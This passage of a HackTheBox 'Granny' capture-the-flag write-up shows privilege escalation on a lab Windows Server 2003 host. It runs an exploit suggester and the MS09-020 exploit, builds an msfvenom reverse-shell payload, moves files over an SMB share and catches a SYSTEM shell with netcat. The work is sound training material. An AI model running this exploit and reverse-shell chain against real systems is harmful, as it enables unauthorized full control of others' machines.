c:\windows\system32\inetsrv>systeminfo
Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
[...]
System Type:               X86-based PC
[...]
```

- Windows version: **Windows Server 2003 Service Pack 2 Build 3790, X86-based (32-bit) system**

Armed with above information, we can try to escalate our privilege to SYSTEM.

Since the Windows version is "Windows Server 2003", it's so old that none of the potato exploits will work.

**So, we can try to perform Kernel Exploit (KE):**

To find which KE we can use, there's a tool called [`windows-exploit-suggester.py`](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), which will suggest which KEs we can use.

- **Copy `systeminfo`'s output to our attacker machine:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|18:53:01(HKT)]
└> cat << EOF > systeminfo.txt
then> >....                                                                                                
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              INTEL  - 6040000                                              
Windows Directory:         C:\WINDOWS      
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB                                   
Available Physical Memory: 787 MB  
Page File: Max Size:       2,470 MB
Page File: Available:      2,307 MB
Page File: In Use:         163 MB  
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB            
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222         
Network Card(s):           N/A          

then> EOF
```

- **Get Microsoft vulnerability database:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|18:54:09(HKT)]
└> python2 /opt/windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2023-08-01-mssb.xls
[*] done
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|18:54:46(HKT)]
└> file 2023-08-01-mssb.xls 
2023-08-01-mssb.xls: Microsoft Excel 2007+
```

- **Run the suggester:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|18:54:58(HKT)]
└> python2 /opt/windows-exploit-suggester.py --database 2023-08-01-mssb.xls --systeminfo systeminfo.txt 
[...]
[*] comparing the 1 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits
[*] there are now 356 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2003 SP2 32-bit'
[...]
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[...]
[M] MS09-053: Vulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254) - Important
[M] MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important
[M] MS09-004: Vulnerability in Microsoft SQL Server Could Allow Remote Code Execution (959420) - Important
[M] MS09-002: Cumulative Security Update for Internet Explorer (961260) (961260) - Critical
[M] MS09-001: Vulnerabilities in SMB Could Allow Remote Code Execution (958687) - Critical
[M] MS08-078: Security Update for Internet Explorer (960714) - Critical
[*] done
```

As you can see, it found bunch of KEs.

After *literally* tried all of the suggested KEs, I found that "MS09-020" worked. Surprisely, this KE is "WebDAV Unicode Authentication Bypass", which we're already tried to exploit during the initial foothold process!

**To escalate to SYSTEM privilege, we can:**

- **Download [MS09-020 exploit](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-020) from [SecWiki](https://github.com/SecWiki)'s [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) GitHub repository:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Granny/images/Pasted%20image%2020230801192314.png)

- **Unzip it:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|19:20:41(HKT)]
└> mv /home/siunam/Downloads/MS09-020-KB970483-CVE-2009-1535-IIS6.zip .
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|19:20:43(HKT)]
└> unzip MS09-020-KB970483-CVE-2009-1535-IIS6.zip 
Archive:  MS09-020-KB970483-CVE-2009-1535-IIS6.zip
   creating: MS09-020-KB970483-CVE-2009-1535-IIS6/
  inflating: MS09-020-KB970483-CVE-2009-1535-IIS6/IIS6.0.exe  
```

- **Transfer `IIS6.0.exe` via SMB using `impacket-smbserver`:**

> Note: I tried to transfer files via `certutil` and PowerShell, but it seems like the `-urlcache` option doesn't work on Windows Server 2003, and PowerShell just doesn't exist in this Windows version.

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|19:20:49(HKT)]
└> cd MS09-020-KB970483-CVE-2009-1535-IIS6 
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny/MS09-020-KB970483-CVE-2009-1535-IIS6)-[2023.08.01|19:20:50(HKT)]
└> impacket-smbserver attacker_share .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```shell
c:\windows\system32\inetsrv>copy \\10.10.14.7\ATTACKER_SHARE\IIS6.0.exe C:\Windows\Temp\IIS6.0.exe
        1 file(s) copied.
```

```shell
c:\windows\system32\inetsrv>C:\Windows\Temp\IIS6.0.exe whoami
nt authority\system
-------------------------------------------
kindle-->Got WMI process Pid: 1872 
begin to try
kindle-->Found token SYSTEM 
kindle-->Command:whoami
```

It worked!

- **Get a reverse shell with SYSTEM privilege:**

**Generate a stageless 32-bit reverse shell executable via `msfvenom`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|19:26:13(HKT)]
└> msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=53 -f exe -o revshell_system.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: revshell_system.exe
```

- **Transfer the reverse shell executable via SMB:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|19:27:50(HKT)]
└> impacket-smbserver attacker_share .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```shell
c:\windows\system32\inetsrv>copy \\10.10.14.7\ATTACKER_SHARE\revshell_system.exe C:\Windows\Temp\revshell_system.exe
copy \\10.10.14.7\ATTACKER_SHARE\revshell_system.exe C:\Windows\Temp\revshell_system.exe
        1 file(s) copied.
```

- **Setup a netcat listener:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|19:28:27(HKT)]
└> rlwrap -cAr nc -lvnp 53 
listening on [any] 53 ...
```

- **Run the exploit with the reverse shell executable as the command:**

```shell
c:\windows\system32\inetsrv>C:\Windows\Temp\IIS6.0.exe C:\Windows\Temp\revshell_system.exe
C:\Windows\Temp\IIS6.0.exe C:\Windows\Temp\revshell_system.exe
-------------------------------------------
kindle-->Got WMI process Pid: 2540 
begin to try
kindle-->Found token SYSTEM 
kindle-->Command:C:\Windows\Temp\revshell_system.exe
```

- **Profit:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|19:31:34(HKT)]
└> rlwrap -cAr nc -lvnp 53
listening on [any] 53 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.15] 1047
[...]
c:\windows\system32\inetsrv>whoami && ipconfig /all
nt authority\system

Windows IP Configuration

   Host Name . . . . . . . . . . . . : granny
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Unknown
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-96-87
   DHCP Enabled. . . . . . . . . . . : No
   IP Address. . . . . . . . . . . . : 10.10.10.15
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
```

I'm now `NT AUTHORITY\SYSTEM`! :D

**user.txt:**
```shell
C:\Documents and Settings\Lakis\Desktop>type user.txt
{Redacted}
```

## Rooted

**root.txt:**
```shell
C:\Documents and Settings\Administrator\Desktop>type root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Granny/images/Pasted%20image%2020230801193356.png)

## Conclusion

What we've learned:

1. Exploiting Microsoft IIS 6.0 WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow
2. Vertical Privilege Escalation Via Exploiting MS09-020 Kernel Exploit